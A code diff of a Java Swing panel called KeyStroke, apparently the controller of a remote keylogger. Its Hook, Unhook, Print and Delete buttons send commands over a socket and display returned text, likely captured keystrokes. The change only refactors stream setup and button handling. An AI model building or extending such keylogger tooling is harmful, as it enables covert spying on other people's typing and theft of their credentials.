@@ -95,6 +95,12 @@ class KeyStroke extends JPanel implements Runnable {
         Delete.setFocusable(false);
         Delete.setBounds(550,20,150,50);
 
+        try {
+            dataOutputStream = new DataOutputStream(socket.getOutputStream());
+        }
+        catch (Exception e) {
+            DebugMessage.printDebugMessage(e);
+        }
         add(Hook);
         add(Unhook);
         add(Print);
@@ -111,41 +117,37 @@ class KeyStroke extends JPanel implements Runnable {
                 Unhook.setEnabled(true);
                 Print.setEnabled(true);
                 Delete.setEnabled(true);
-                dataOutputStream = new DataOutputStream(socket.getOutputStream());
                 dataOutputStream.writeUTF("H");
             }catch (Exception k){
                 DebugMessage.printDebugMessage(k);
             }
         }
-        if (e.getSource() == Unhook) {
+        else if (e.getSource() == Unhook) {
             try {
                 Hook.setEnabled(true);
                 Unhook.setEnabled(false);
                 Print.setEnabled(true);
                 Delete.setEnabled(true);
-                dataOutputStream = new DataOutputStream(socket.getOutputStream());
                 dataOutputStream.writeUTF("UH");
             }catch (Exception k){
                 DebugMessage.printDebugMessage(k);
             }
         }
-        if (e.getSource() == Print){
+        else if (e.getSource() == Print){
             try {
                 Hook.setEnabled(true);
                 Unhook.setEnabled(true);
                 Print.setEnabled(false);
                 Delete.setEnabled(true);
                 dataInputStream = new DataInputStream(socket.getInputStream());
-                dataOutputStream = new DataOutputStream(socket.getOutputStream());
                 dataOutputStream.writeUTF("P");
-
                 String s = dataInputStream.readUTF();
                 text.append(s);
             }catch (Exception k){
                 DebugMessage.printDebugMessage(k);
             }
         }
-        if (e.getSource() == Delete){
+        else if (e.getSource() == Delete){
             try {
                 Hook.setEnabled(true);
                 Unhook.setEnabled(true);
